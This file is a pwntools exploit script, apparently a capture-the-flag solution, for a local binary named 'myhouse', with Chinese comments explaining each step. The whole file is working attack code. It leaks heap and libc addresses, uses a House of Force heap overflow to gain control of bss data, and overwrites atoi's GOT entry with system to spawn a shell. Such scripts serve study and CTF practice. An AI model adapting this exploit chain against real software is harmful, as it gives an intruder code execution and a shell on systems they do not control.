#!usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

#context(os='linux', arch='amd64', log_level='debug')
p = process("./myhouse")
libc = ELF("./libc-2.23.so")

def addh(name,hname,size,size2,data):
    p.recvuntil("name?\n")
    p.send(name)
    p.recvuntil("house?\n")
    p.send(hname)
    p.recvuntil("house?\n")
    p.send(str(size))
    p.recvuntil("Too large!\n")
    p.send(str(size2))
    p.recvuntil("description:\n")
    p.send(data)

def add(size):
    p.recvuntil("Your choice:\n")
    p.sendline(str(1))
    p.recvuntil("room?\n")
    p.send(str(size))

def edit(data):
    p.recvuntil("Your choice:\n")
    p.sendline(str(2))
    p.recvuntil("shining!\n")
    p.send(data)

def show():
    p.recvuntil("Your choice:\n")
    p.sendline(str(3))

def g(p):
    gdb.attach(p)
    raw_input()

# 写 main_arena 的 top 指针低字节为\x00，并泄露heap地址
top_addr= 0x3c4b78
mmap_size = 0x201000
offset = mmap_size - 0x10 + top_addr + 1
addh("A"*0x20 ,"1"*0xf0+p64(0)+p64(0xffffffffffffffff),offset,0x200000,'2'*0x20)
show()
p.recvuntil("A"*0x20)
heap = u64(p.recvuntil('\n',drop=True).ljust(0x8,"\x00"))
print "heap : "+hex(heap)

# 利用house of force 降低topchunk到bss段
bss = 0x6020b0 
topchunk_addr = heap + 0x100
attack = bss - topchunk_addr
print "attack : "+hex(attack)
add(attack)

# 分配到bss段的chunk，控制bss段数据，往housed指针与room指针写atoi_got
add(0x60)
atoi_got = 0x602058
payload = p64(atoi_got) + p64(atoi_got) 
edit(payload)

# 泄露atoi,system地址
show()
p.recvuntil("description:\x0a")
atoi_addr = u64(p.recvuntil('\n',drop=True).ljust(0x8,"\x00"))
print "atoi_addr : "+hex(atoi_addr)
system_addr = atoi_addr -libc.symbols['atoi'] + libc.symbols['system']
print "system_addr : "+hex(system_addr)

# 写atoi函数got表为system函数地址
edit(p64(system_addr))
p.recvuntil("choice:")

# get shell
p.send("/bin/sh\x00")
p.interactive()
